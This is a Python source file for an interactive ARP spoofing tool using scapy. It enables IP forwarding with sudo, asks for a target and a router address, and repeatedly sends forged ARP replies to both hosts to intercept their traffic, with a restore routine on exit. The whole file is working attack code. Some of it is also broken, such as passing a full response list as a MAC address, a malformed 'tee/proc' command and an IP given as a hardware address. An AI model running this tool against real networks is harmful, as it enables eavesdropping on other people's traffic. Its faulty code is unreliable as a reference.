def arp_spoofer():
        import os
        import time
        import sys
        import subprocess
        try:
            from colorama import Fore
        except:
            time.sleep(1)
            print("[-] Pleass Install The Librery --> colorama")
            sys.exit()
        try:
            from scapy.layers.l2 import ARP , Ether
            from scapy.sendrecv import srp , send
        except:
            time.sleep(1)
            print("[-] Pleass Install The Librery --> scapy")
            sys.exit()
        from baner import baner
        get_res_ip_forwarding = subprocess.getoutput("echo 1 | sudo tee/proc/sys/net/ipv4/ip_forward")
        baner()
        time.sleep(1)
        ip_target = input(Fore.BLUE + "\n[!]" + Fore.YELLOW + " ~ " + Fore.BLUE + "Enter The Ip Target :" + Fore.YELLOW + " ")
        if ip_target == "" or None:
            time.sleep(1)
            print(Fore.RED + "[-] Your Input Is None !!!")
            sys.exit()
        else:
            count = 0
            for i in ip_target:
                if i == ".":
                    count += 1
                else:
                    pass
            if count == 3:
                pass
            else:
                time.sleep(1)
                print(Fore.RED + "[-] Your Input Is Not Found !!!")
                sys.exit()
        ip_router = input(Fore.BLUE + "\n[!]" + Fore.YELLOW + " ~ " + Fore.BLUE + "Enter The Ip Router Board :" + Fore.YELLOW + " ")
        if ip_router == "" or None:
            time.sleep(1)
            print(Fore.RED + "[-] Your Input Is None !!!")
            sys.exit()
        else:
            count1 = 0
            for i in ip_router:
                if i == ".":
                    count1 += 1
                else:
                    pass
            if count1 == 3:
                pass
            else:
                time.sleep(1)
                print(Fore.RED + "[-] Your Input Is Not Found !!!")
                sys.exit()
        def spoof(ip_t , ip_r):
            ip_target = ip_t
            ip_router = ip_r
            arp_request = ARP(pdst=ip_target)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            broadcast_arp_requests = broadcast / arp_request
            result = srp(broadcast_arp_requests , timeout=2 , verbose=False)[0]
            target_mac = result
            packed = ARP(op=2 , pdst = ip_target , psrc=ip_router , hwdst=target_mac)
            send(packed , verbose=False)
        def restory(ip_t , ip_r):
            ip_target = ip_t
            ip_router = ip_r
            arp_request = ARP(pdst=ip_target)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            broadcast_arp_requests = broadcast / arp_request
            result = srp(broadcast_arp_requests , timeout=2 , verbose=False)[0]
            target_mac = result
            new_packed = ARP(op=2 , pdst=ip_target , psrc=ip_router , hwdst=ip_target , hwsrc=target_mac)
            send(new_packed , verbose=False , count=6)
        try:
            count_packed = 0
            while True:
                spoof(ip_target , ip_router)
                spoof(ip_router , ip_target)
                count_packed += 2
                sys.stdout.write("\r[+] Count Packed Requests : " + str(count_packed)),sys.stdout.flush()
                time.sleep(2)
        except KeyboardInterrupt:
            restory(ip_target , ip_router)
            print(Fore.GREEN + "\nDONE")
            sys.exit()
